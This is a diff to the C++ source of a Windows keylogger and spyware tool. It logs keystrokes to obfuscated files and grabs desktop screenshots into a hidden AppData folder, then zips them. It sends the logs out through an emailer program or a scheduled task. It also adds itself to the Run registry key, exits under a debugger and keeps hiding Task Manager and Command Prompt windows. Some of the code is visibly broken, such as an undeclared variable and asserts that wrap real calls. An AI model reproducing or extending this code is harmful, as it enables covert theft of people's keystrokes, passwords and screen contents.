@@ -22,6 +22,7 @@
 #include <shellapi.h>
 #include <time.h>
 #include <taskschd.h>
+#include <assert.h>
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
 
@@ -43,7 +44,9 @@ typedef unsigned long long uint64_t;
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
 #define SecondsBetweenScreenshots 20000
-
+#define SendersEmail "YourEmail"
+#define SendersPsw "YourPassword"
+#define RecieversEmail "YourEmail2"
 
 #define MAX_LENGTH 1024
 
@@ -63,496 +66,24 @@ typedef unsigned long long uint64_t;
 
 #define debug
 
-
 FILE* OUTPUT_FILE;
 
-
-
-
 extern "C" int RandomGenerator();
-
-
-int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
-{
-    int len = strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
-    char* tempdir = (char*)malloc(len);
-    memset(tempdir, 0, len);
-    strcpy(tempdir, dir);
-
-    SHFILEOPSTRUCTA file_op = {
-      NULL,
-      FO_DELETE,
-      tempdir,
-      NULL,
-      FOF_NOCONFIRMATION |
-      FOF_NOERRORUI |
-      FOF_SILENT,
-      false,
-      0,
-      "" };
-    int ret = SHFileOperationA(&file_op);
-    free(tempdir);
-    return ret; // returns 0 on success, non zero on failure.
-}
-
-BOOL WINAPI SaveBitmap(std::string wPath)
-{
-    BITMAPFILEHEADER bfHeader;
-    BITMAPINFOHEADER biHeader;
-    BITMAPINFO bInfo;
-    HGDIOBJ hTempBitmap;
-    HBITMAP hBitmap;
-    BITMAP bAllDesktops;
-    HDC hDC, hMemDC;
-    LONG lWidth, lHeight;
-    BYTE* bBits = NULL;
-    HANDLE hHeap = GetProcessHeap();
-    DWORD cbBits, dwWritten = 0;
-    HANDLE hFile;
-    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-
-    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
-    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
-    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
-    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
-
-    hDC = GetDC(NULL);
-    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
-    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
-
-    lWidth = bAllDesktops.bmWidth;
-    lHeight = bAllDesktops.bmHeight;
-
-    DeleteObject(hTempBitmap);
-
-    bfHeader.bfType = (WORD)('B' | ('M' << 8));
-    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    biHeader.biSize = sizeof(BITMAPINFOHEADER);
-    biHeader.biBitCount = 24;
-    biHeader.biCompression = BI_RGB;
-    biHeader.biPlanes = 1;
-    biHeader.biWidth = lWidth;
-    biHeader.biHeight = lHeight;
-
-    bInfo.bmiHeader = biHeader;
-
-    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
-
-    hMemDC = CreateCompatibleDC(hDC);
-    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
-    SelectObject(hMemDC, hBitmap);
-    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
-
-
-    hFile = CreateFileA(wPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
-    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
-    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
-
-    CloseHandle(hFile);
-
-    DeleteDC(hMemDC);
-    ReleaseDC(NULL, hDC);
-    DeleteObject(hBitmap);
-
-    return TRUE;
-}
-
-
-HRESULT SetUploadTask(std::string PathToEmailer, std::string LogToSend) {  //thank you Microsoft for not documenting shit and forcing me to dig every little bit on the internet just to make this
-    CA2W PathToEmailerUnicode(PathToEmailer.c_str());
-    CA2W LogToSendUnicode(LogToSend.c_str());
-    CComPtr<ITaskService> service;
-    service.CoCreateInstance(__uuidof(TaskScheduler));
-    service->Connect(CComVariant(),CComVariant(),CComVariant(),CComVariant());
-    CComPtr<ITaskFolder> folder;
-    service->GetFolder(CComBSTR(L"\\"), &folder);
-    CComPtr<ITaskFolder> newFolder;
-    folder->CreateFolder(CComBSTR(L"MagikIndex"),CComVariant(), &newFolder);
-    CComPtr<ITaskDefinition> definition;
-    service->NewTask(0, &definition);
-    CComPtr<IPrincipal> principal;
-    definition->get_Principal(&principal);
-    principal->put_RunLevel(TASK_RUNLEVEL_LUA);
-    CComPtr<IActionCollection> actions;
-    definition->get_Actions(&actions);
-    CComPtr<IAction> action;
-    actions->Create(TASK_ACTION_EXEC, &action);
-    CComQIPtr<IExecAction> execAction(action);
-    execAction->put_Path(CComBSTR(PathToEmailerUnicode));
-    execAction->put_Arguments(CComBSTR(LogToSendUnicode));
-    CComPtr<ITriggerCollection> triggers;
-    definition->get_Triggers(&triggers);
-    CComPtr<ITrigger> trigger;
-    triggers->Create(TASK_TRIGGER_DAILY, &trigger);
-    CComQIPtr<IDailyTrigger> weeklyTrigger(trigger);
-    weeklyTrigger->put_StartBoundary(CComBSTR(L"2007-01-01T02:00:00-08:00"));
-    weeklyTrigger->put_EndBoundary(CComBSTR(L"2035-05-02T12:05:00"));
-    weeklyTrigger->put_DaysInterval((short)2);
-    CComPtr<IRegisteredTask> registeredTask;
-    folder->RegisterTaskDefinition(CComBSTR(L"Task"), definition, TASK_CREATE_OR_UPDATE, CComVariant(), CComVariant(), TASK_LOGON_INTERACTIVE_TOKEN, CComVariant(), &registeredTask);
-}
-
-std::set<DWORD> getAllThreadIds()
-{
-    auto processId = GetCurrentProcessId();
-    auto currThreadId = GetCurrentThreadId();
-    std::set<DWORD> thread_ids;
-    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
-    if (h.get() != INVALID_HANDLE_VALUE)
-    {
-        THREADENTRY32 te;
-        te.dwSize = sizeof(te);
-        if (Thread32First(h.get(), &te))
-        {
-            do
-            {
-                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
-                {
-                    //only enumerate threads that are called by this process and not the main thread
-                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
-                    {
-                        thread_ids.insert(te.th32ThreadID);
-                    }
-                }
-                te.dwSize = sizeof(te);
-            } while (Thread32Next(h.get(), &te));
-        }
-    }
-    return thread_ids;
-}
-
-template <class InputIterator>
-HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
-{
-    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
-    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
-    IShellDispatchPtr shell;
-    FolderPtr destFolder;
-
-    variant_t dirName, fileName, options;
-
-    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
-    if (SUCCEEDED(hr))
-    {
-        dirName = dest;
-        hr = shell->NameSpace(dirName, &destFolder);
-        if (SUCCEEDED(hr))
-        {
-            auto existingThreadIds = getAllThreadIds();
-            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
-            while (first != last)
-            {
-                fileName = *first;
-                printf("Copying %s to %s ...\n", *first, dest);
-                ++first;
-                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error
-
-                auto updatedThreadIds = getAllThreadIds();
-                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
-                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));
-
-                std::vector<HANDLE> threads;
-                for (auto threadId : newThreadIds)
-                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));
-
-                if (!threads.empty())
-                {
-                    // Waiting for new threads to finish not more than 5 min.
-                    WaitForMultipleObjects(threads.size(), &threads[0], TRUE, 5 * 60 * 1000);
-
-                    for (size_t i = 0; i < threads.size(); i++)
-                        CloseHandle(threads[i]);
-                }
-            }
-        }
-    }
-    return hr;
-}
-
-
-ULONG WINAPI ScreenGrabber(LPVOID Parameter) {
-
-    char* AppData = nullptr;
-    char UserName[MAX_LENGTH + 1];
-    DWORD Size = MAX_LENGTH + 1;
-    GetUserNameA(UserName, &Size);
-    size_t AppDataSize;
-    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-    std::string CurrentLog;
-    char PathToFile[MAX_PATH];
-    HMODULE GetModH = GetModuleHandle(NULL);
-    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
-    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
-    std::string ScreenshotDir = AppData;
-    ScreenshotDir += "\\MagikGlass";
-    DWORD DWFlags;
-
-    while (1) {
-        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
-        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-        for (int i = 0; i < 20; i++) {
-            CurrentLog = ScreenshotDir;
-            CurrentLog += "\\ScreenShot";
-            CurrentLog += std::to_string(rand() % 10000 - 1000);
-            CurrentLog += ".bmp";
-
-            SaveBitmap(CurrentLog);
-
-            Sleep(SecondsBetweenScreenshots);
-        }
-        std::string ZipPath = ScreenshotDir;
-        ZipPath += "\\Zip";
-        ZipPath += std::to_string(rand() % 10000 - 1000);
-        ZipPath += ".zip";
-
-        FILE* f = fopen(ZipPath.c_str(), "wb");
-        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
-        fclose(f);
-
-        const char* files[] = {
-            ScreenshotDir.c_str()
-        };
-
-        {
-            CoInitialize(NULL);
-            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
-            CoUninitialize();
-        }
-
-        std::string Emailer = "C:\\Users\\";
-        Emailer += UserName;
-        Emailer += "\\Music\\MagikIndex";
-        Emailer += "\\emailer.exe ";
-
-        if (!InternetGetConnectedState(&DWFlags, NULL)) {
-            SetUploadTask(Emailer, ZipPath);
-        }
-        else {
-            Emailer += ZipPath;
-            system(Emailer.c_str());
-        }
-
-        Sleep(60000);
-
-        SilentlyRemoveDirectory(ScreenshotDir.c_str());
-
-    }
-}
-
-
-int ExtrapolateKey() {
-
-    std::string Passwd = CryptPassword;
-    int ExtrapolatedKey = BaseShiftValue;
-    for (int plq = 0; plq < Passwd.size(); plq++) {
-        ExtrapolatedKey += (int)Passwd[plq];
-    }
-    return ExtrapolatedKey;
-}
-
-
-int CalculateDirSize(std::string DirectoryToCheck) {
-
-    HANDLE hFind;
-    WIN32_FIND_DATAA data;
-
-    DirectoryToCheck += "\\*.*";
-
-    int FileCounter = 0;
-
-    //char FilePath[MAX_PATH + 1];
-    DWORD FileSize = MAX_PATH + 1;
-
-    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
-            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
-            FileCounter++;
-            //}
-        } while (FindNextFileA(hFind, &data));
-        FindClose(hFind);
-    }
-
-    return FileCounter;
-}
-
-
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
-{
-    HKEY hKey = NULL;
-    LONG lResult = 0;
-    BOOL fSuccess = TRUE;
-    DWORD dwSize;
-
-    const size_t count = MAX_PATH * 2;
-    char szValue[count] = {};
-
-
-    strcpy_s(szValue, "\"");
-    strcat_s(szValue, pathToExe);
-    strcat_s(szValue, "\" ");
-
-    if (args != NULL)
-    {
-        strcat_s(szValue, args);
-    }
-
-    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
-
-    fSuccess = (lResult == 0);
-
-    if (fSuccess)
-    {
-        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
-        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
-        fSuccess = (lResult == 0);
-    }
-
-    if (hKey != NULL)
-    {
-        RegCloseKey(hKey);
-        hKey = NULL;
-    }
-
-    return fSuccess;
-}
-
-std::string EncryptMyString(std::string UnencryptedString) {
-#ifndef debug
-    std::string CryptedString;
-    for (int r = 0; r < UnencryptedString.size(); r++) {
-        CryptedString += UnencryptedString[r] + ExtrapolateKey();
-    }
-    UnencryptedString = CryptedString;
-#endif
-    return UnencryptedString;
-}
-
-void LogItInt(int key_stroke,std::string FileName) {
-    if (key_stroke == 1 || key_stroke == 2) 
-        return;
-    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
-        return;
-
-    fopen_s(&OUTPUT_FILE,FileName.c_str(), "a+");
-
-    std::cout << key_stroke << std::endl;
-
-    if (key_stroke == 8)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
-    else if (key_stroke == 13)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
-    else if (key_stroke == VK_SPACE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
-    else if (key_stroke == VK_LWIN)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
-    else if (key_stroke == VK_TAB)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
-    else if (key_stroke == VK_CAPITAL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
-    else if (key_stroke == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
-    else if (key_stroke == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
-    else if (key_stroke == VK_ESCAPE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
-    else if (key_stroke == VK_END)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
-    else if (key_stroke == VK_HOME)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
-    else if (key_stroke == VK_DELETE)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
-    else if (key_stroke == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
-    else if (key_stroke == VK_UP)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
-    else if (key_stroke == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
-    else if (key_stroke == VK_DOWN)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
-    else if (key_stroke == 190 || key_stroke == 110)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
-    else
-#ifndef debug
-        key_stroke += ExtrapolateKey();
-#endif
-        fprintf(OUTPUT_FILE, "%s", &key_stroke);
-    fclose(OUTPUT_FILE);
-}
-
-/*
-void FileSubmit(const char* localfile, const char* remotefile)
-{
-    HINTERNET hInternet;
-    HINTERNET hFtpSession;
-    hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (hInternet == NULL)
-    {
-        std::cout << "Error: " << GetLastError();
-
-    }
-    else
-    {
-        hFtpSession = InternetConnectA(hInternet, MyServer, INTERNET_DEFAULT_FTP_PORT, User, Password, INTERNET_SERVICE_FTP, 0, 0);
-        if (hFtpSession == NULL)
-        {
-            std::cout << "Error ftp: " << GetLastError();
-        }
-        else
-        {
-
-            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0)){}
-        }
-    }
-}
-*/
-
-void LogItChar(std::string Value, std::string FileName) {
-#ifndef debug
-    if (IsDebuggerPresent()) {
-        exit(0);
-    }
-
-#endif
-
-    Value += "\n";
-
-    std::ofstream File;
-    File.open(FileName, std::ios_base::app);
-    File << EncryptMyString(Value);
-    File.close();
-}
-
-
+int SilentlyRemoveDirectory(const char* dir);
+PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp);
+void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP);
+BOOL WINAPI SaveBitmap(std::string wPath);
+std::set<DWORD> getAllThreadIds();
+template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
+ULONG WINAPI ScreenGrabber(LPVOID Parameter);
+int ExtrapolateKey();
+int CalculateDirSize(std::string DirectoryToCheck);
+BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args); 
+std::string EncryptMyString(std::string UnencryptedString);
+void LogItInt(int key_stroke, std::string FileName);
+void LogItChar(std::string Value, std::string FileName);
+void SendLog(std::string CurrentLog);
 ULONG WINAPI Protect(LPVOID);
-
-
-ULONG WINAPI Protect(LPVOID Parameter) {
-
-    if (IsDebuggerPresent()){
-        exit(0);
-    }
-    while (1) {
-
-        HWND Prog;
-        Prog = FindWindowA(NULL, "Task Manager");
-        ShowWindow(Prog, 0);
-        Prog = FindWindowA(NULL, "Windows Task Manager");
-        ShowWindow(Prog, 0);
-        Prog = FindWindowA(NULL, "Command Prompt");
-        ShowWindow(Prog, 0);
-        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
-        ShowWindow(Prog, 0);
-        Prog = FindWindowA(NULL, "Run");
-        ShowWindow(Prog, 0);
-        Sleep(200);
-    }
-    return 0;
-}
-
 
 int main()
 {
@@ -729,14 +260,6 @@ Log:
             LogItChar("Cleaned MagikIndex folder...", CurrentLog);
             Sleep(200);
         }
-
-        std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
-        std::string EmailerPath = std::string(PathToFile).substr(0, pos);
-        EmailerPath += "\\emailer.exe";
-        std::string EmailerDestination = DestinationFile;
-        EmailerDestination += "\\emailer.exe";
-        CopyFileA(EmailerPath.c_str(), EmailerDestination.c_str(), false);
-        LogItChar("Copied emailer.exe...", CurrentLog);
         DestinationFile += "\\";
 
         std::string CopiedFile;
@@ -971,22 +494,554 @@ Log:
      LogItChar("\n_____________________________________________", CurrentLog);
      LogItChar("Character limit hit, sending log...",CurrentLog);
 
-     std::string Emailer = "C:\\Users\\";
-     Emailer += UserName;
-     Emailer += "\\Music\\MagikIndex";
-     Emailer += "\\emailer.exe ";
-
-     if (!InternetGetConnectedState(&DWFlags, NULL)) {
-         LogItChar("No Internet, scheduling task for log extraction...",CurrentLog);
-         SetUploadTask(Emailer,CurrentLog);
-     }else{
-         Emailer += CurrentLog;
-         system(Emailer.c_str());
-     }
+     SendLog(CurrentLog);
      FirstLog = false;
 
      goto Log;
      return 0;
 }
+
+int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
+{
+    int len = (int)strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
+    char* tempdir = (char*)malloc(len);
+    memset(tempdir, 0, len);
+    strcpy(tempdir, dir);
+
+    SHFILEOPSTRUCTA file_op = {
+      NULL,
+      FO_DELETE,
+      tempdir,
+      NULL,
+      FOF_NOCONFIRMATION |
+      FOF_NOERRORUI |
+      FOF_SILENT,
+      false,
+      0,
+      "" };
+    int ret = SHFileOperationA(&file_op);
+    free(tempdir);
+    return ret; // returns 0 on success, non zero on failure.
+}
+
+PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
+{
+    BITMAP bmp;
+    PBITMAPINFO pbmi;
+    WORD    cClrBits;
+
+    ZeroMemory(&bmp, sizeof(bmp));
+
+    // Retrieve the bitmap color format, width, and height.  
+    assert(GetObjectA(hBmp, sizeof(BITMAP), (LPSTR)&bmp));
+
+    // Convert the color format to a count of bits.  
+    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
+    if (cClrBits == 1)
+        cClrBits = 1;
+    else if (cClrBits <= 4)
+        cClrBits = 4;
+    else if (cClrBits <= 8)
+        cClrBits = 8;
+    else if (cClrBits <= 16)
+        cClrBits = 16;
+    else if (cClrBits <= 24)
+        cClrBits = 24;
+    else cClrBits = 32;
+
+    // Allocate memory for the BITMAPINFO structure. (This structure  
+    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
+    // data structures.)  
+
+    if (cClrBits < 24)
+        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+            sizeof(BITMAPINFOHEADER) +
+            sizeof(RGBQUAD) * (1 << cClrBits));
+
+    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 
+
+    else
+        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+            sizeof(BITMAPINFOHEADER));
+
+    // Initialize the fields in the BITMAPINFO structure.  
+
+    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    pbmi->bmiHeader.biWidth = bmp.bmWidth;
+    pbmi->bmiHeader.biHeight = bmp.bmHeight;
+    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
+    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
+    if (cClrBits < 24)
+        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);
+
+    // If the bitmap is not compressed, set the BI_RGB flag.  
+    pbmi->bmiHeader.biCompression = BI_RGB;
+
+    // Compute the number of bytes in the array of color  
+    // indices and store the result in biSizeImage.  
+    // The width must be DWORD aligned unless the bitmap is RLE 
+    // compressed. 
+    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
+        * pbmi->bmiHeader.biHeight;
+    // Set biClrImportant to 0, indicating that all of the  
+    // device colors are important.  
+    pbmi->bmiHeader.biClrImportant = 0;
+    return pbmi;
+}
+
+void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP)
+{
+    HANDLE hf;
+    BITMAPFILEHEADER hdr;
+    PBITMAPINFOHEADER pbih;
+    LPBYTE lpBits;
+    DWORD dwTotal;
+    DWORD cb;
+    BYTE* hp;
+    PBITMAPINFO pbi;
+    HDC hDC;
+    hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));
+    SelectObject(hDC, hBMP);
+    pbi = CreateBitmapInfoStruct(hBMP);
+    pbih = (PBITMAPINFOHEADER)pbi;
+    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
+    assert(lpBits);
+    assert(GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS));
+    hf = CreateFileA(pszFile, GENERIC_READ | GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
+    assert(hf != INVALID_HANDLE_VALUE);
+    hdr.bfType = 0x4d42;
+    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
+    hdr.bfReserved1 = 0;
+    hdr.bfReserved2 = 0;
+    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);
+    assert(WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL));
+    assert(WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&dwTmp, (NULL)));
+    dwTotal = cb = pbih->biSizeImage;
+    hp = lpBits;
+    assert(WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL));
+    assert(CloseHandle(hf));
+    GlobalFree((HGLOBAL)lpBits);
+}
+
+BOOL WINAPI SaveBitmap(std::string wPath)
+{
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE* bBits = NULL;
+    HANDLE hHeap = GetProcessHeap();
+    DWORD cbBits, dwWritten = 0;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24;
+    biHeader.biCompression = BI_RGB;
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+
+    CreateBMPFile(wPath.c_str(), hBitmap);
+    return true;
+}
+
+
+
+std::set<DWORD> getAllThreadIds()
+{
+    auto processId = GetCurrentProcessId();
+    auto currThreadId = GetCurrentThreadId();
+    std::set<DWORD> thread_ids;
+    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
+    if (h.get() != INVALID_HANDLE_VALUE)
+    {
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+        if (Thread32First(h.get(), &te))
+        {
+            do
+            {
+                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
+                {
+                    //only enumerate threads that are called by this process and not the main thread
+                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
+                    {
+                        thread_ids.insert(te.th32ThreadID);
+                    }
+                }
+                te.dwSize = sizeof(te);
+            } while (Thread32Next(h.get(), &te));
+        }
+    }
+    return thread_ids;
+}
+
+template <class InputIterator>
+HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
+{
+    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
+    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
+    IShellDispatchPtr shell;
+    FolderPtr destFolder;
+
+    variant_t dirName, fileName, options;
+
+    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
+    if (SUCCEEDED(hr))
+    {
+        dirName = dest;
+        hr = shell->NameSpace(dirName, &destFolder);
+        if (SUCCEEDED(hr))
+        {
+            auto existingThreadIds = getAllThreadIds();
+            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
+            while (first != last)
+            {
+                fileName = *first;
+                printf("Copying %s to %s ...\n", *first, dest);
+                ++first;
+                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error
+
+                auto updatedThreadIds = getAllThreadIds();
+                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
+                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));
+
+                std::vector<HANDLE> threads;
+                for (auto threadId : newThreadIds)
+                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));
+
+                if (!threads.empty())
+                {
+                    // Waiting for new threads to finish not more than 5 min.
+                    WaitForMultipleObjects(threads.size(), &threads[0], TRUE, 5 * 60 * 1000);
+
+                    for (size_t i = 0; i < threads.size(); i++)
+                        CloseHandle(threads[i]);
+                }
+            }
+        }
+    }
+    return hr;
+}
+
+
+ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
+
+    char* AppData = nullptr;
+    DWORD Size = MAX_LENGTH + 1;
+    size_t AppDataSize;
+    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+    std::string CurrentLog;
+    char PathToFile[MAX_PATH];
+    HMODULE GetModH = GetModuleHandle(NULL);
+    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
+    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
+    std::string ScreenshotDir = AppData;
+    ScreenshotDir += "\\MagikGlass";
+    DWORD DWFlags;
+
+    while (1) {
+        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
